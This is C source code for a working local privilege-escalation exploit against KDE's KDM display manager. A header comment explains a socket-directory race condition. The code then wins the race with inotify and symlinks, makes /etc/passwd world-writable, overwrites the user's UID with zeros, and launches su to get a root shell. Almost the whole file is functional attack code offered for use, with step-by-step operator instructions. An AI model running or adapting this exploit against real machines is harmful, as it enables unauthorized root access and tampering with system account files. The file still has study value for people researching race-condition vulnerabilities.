/* bambule-digitale.c aka krm.c - KDE Root Manager
 *
 * KDE3/4 KDM local root exploit (C) 2010
 * Successfully tested on openSUSE 11.2 with intel Core2 x64
 * a 1.6Ghz. But this is not Linux specific!
 *
 * Bug is a silly race. KDM opens control socket in
 * /var/run/xdmctl/dmctl-$DISPLAY/socket. It looks safe
 * since the dir containing the socket is chowned to user [2]
 * after the bind()/chmod() [1] has been done. However, rmdir() [3]
 * retval is not checked and therefore upon restart mkdir()
 * for a root owned socket dir fails. Thus still owned by
 * user who can then play symlink tricks:
 *
 * kdm/backend/ctrl.c:
 *
 * ...
 *       if ((cr->fd = socket( PF_UNIX, SOCK_STREAM, 0 )) < 0)
 *              LogError( "Cannot create control socket\n" );
 *       else {
 *              unlink( cr->path );
 *              sa.sun_family = AF_UNIX;
 *              strcpy( sa.sun_path, cr->path );
 *              if (!bind( cr->fd, (struct sockaddr *)&sa, sizeof(sa) )) {
 *                      if (!listen( cr->fd, 5 )) {
 * [1]                          chmod( cr->path, 0666 );
 *                              RegisterCloseOnFork( cr->fd );
 *                              RegisterInput( cr->fd );
 *                              free( sockdir );
 *                              return;
 *                      }
 *                      unlink( cr->path );
 *                      LogError( "Cannot listen on control socket %\"s\n",
 *                                cr->path );
 * ...
 *
 *
 * void
 * chownCtrl( CtrlRec *cr, int uid )
 * {
 *       if (cr->path) {
 *               char *ptr = strrchr( cr->path, '/' );
 *               *ptr = 0;
 * [2]           chown( cr->path, uid, -1 );
 *               *ptr = '/';
 *       }
 * }
 *
 *
 * void
 * closeCtrl( struct display *d )
 * {
 *       CtrlRec *cr = d ? &d->ctrl : &ctrl;
 *
 *       if (cr->fd >= 0) {
 *               UnregisterInput( cr->fd );
 *               CloseNClearCloseOnFork( cr->fd );
 *               cr->fd = -1;
 *               unlink( cr->path );
 *               *strrchr( cr->path, '/' ) = 0;
 * [3]           rmdir( cr->path );
 *               free( cr->path );
 *               cr->path = 0;
 *               while (cr->css) {
 *                       struct cmdsock *cs = cr->css;
 *                       cr->css = cs->next;
 *                       nukeSock( cs );
 *               }
 *       }
 * }
 *
 * We make [3] fail by creating an entry in socketdir when it was
 * chowned to us. Creating an inotify for socket creations which
 * is delivered to us before chmod at [1]. Even if its very small
 * race we have good chances to win on fast machines with more
 * than one CPU node, e.g. common setup today.
 *
 * Log into KDM session, switch to console and login as same user.
 * Start program and follow instructions.
 *
 * No greets to anyone; you all suck badly :D
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/inotify.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <sched.h>
#include <time.h>


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void give_me_r00t()
{
	int fd;
	char buf[128], c;
	char *pwd = NULL, *ptr = NULL;
	struct stat st;
	off_t off = 0;

	if ((fd = open("/etc/passwd", O_RDWR)) < 0)
		die("[-] open");
	fstat(fd, &st);
	if ((pwd = malloc(st.st_size)) == NULL)
		die("[-] malloc");
	if (read(fd, pwd, st.st_size) != st.st_size)
		die("[-] read");
	snprintf(buf, sizeof(buf), "%s:x:", getenv("USER"));
	ptr = strstr(pwd, buf);
	if (!ptr) {
		printf("[-] Wrong /etc/passwd format\n");
		close(fd);
		return;
	}
	off = lseek(fd, ptr - pwd + strlen(buf), SEEK_SET);
	free(pwd);
	for (;;) {
		pread(fd, &c, 1, off);
		if (c == ':')
			break;
		write(fd, "0", 1);
		++off;
	}
	close(fd);
	sync();
}


int main()
{
	char buf[128];
	int ifd = 0;
	struct stat st;
	struct sockaddr_un sun;
	int sfd;
	const char *sock_dir = "/var/run/xdmctl/dmctl-:0";
	char *su[] = {"/bin/su", getenv("USER"), NULL};

	srand(time(NULL));
	chdir(sock_dir);
	memset(&sun, 0, sizeof(sun));
	sun.sun_family = AF_UNIX;
	strcpy(sun.sun_path, "socket2");

	mkdir("hold me", 0);
	signal(SIGPIPE, SIG_IGN);

	symlink("/etc/passwd", "passwd");
	printf("--==[ KDM3/4 local root PoC successfully tested on dual-core ]==--\n");
	printf("[+] Setup done. switch to KDM session and press Ctrl-Alt-Backspace (logout)\n");
	printf("[+] KDM screen will start to flicker (one restart per 2 seconds)\n");
	printf("[+] Be patient, this can take some minutes! If it takes more than\n");
	printf("[+] 5mins or so it runs on the wrong CPU node; try again.\n");
	printf("[+] If KDM screen stands still again, switch back to console.\n");

	for (;;) {
		if ((sfd = socket(PF_UNIX, SOCK_STREAM, 0)) < 0)
			die("[-] socket");
		if ((ifd = inotify_init()) < 0)
			die("[-] inotify_init");
		if (inotify_add_watch(ifd, sock_dir, IN_CREATE) < 0)
			die("[-] inotify_add_watch");
		unlink("socket2");

		/* blocks until race */
		syscall(SYS_read, ifd, buf, 1);

		/* be very fast, thus syscall() instead of glibc functions */
		syscall(SYS_rename, "socket", "socket2");
		syscall(SYS_symlink, "passwd", "socket");
		close(ifd);
		if (stat("/etc/passwd", &st) < 0)
			die("[-] stat");
		if ((st.st_mode & 0666) == 0666)
			break;
		sleep(2);
		usleep(100 + (int)(50.0*rand()/(RAND_MAX+1.0)));
		if (connect(sfd, (struct sockaddr *)&sun, sizeof(sun)) < 0)
			break;
		write(sfd, "suicide\n", 8);
		close(sfd);
	}

	if (stat("/etc/passwd", &st) < 0)
		die("[-] stat");
	if ((st.st_mode & 0666) != 0666) {
		printf("[-] Exploit failed.\n");
		return 1;
	}

	printf("[+] yummy! /etc/passwd world writable!\n");
	give_me_r00t();
	printf("[+] Type your user password now. If there is no rootshell, nscd is playing tricks. 'su %s' then.\n", getenv("USER"));
	execve(*su, su, NULL);
	return 0;
}

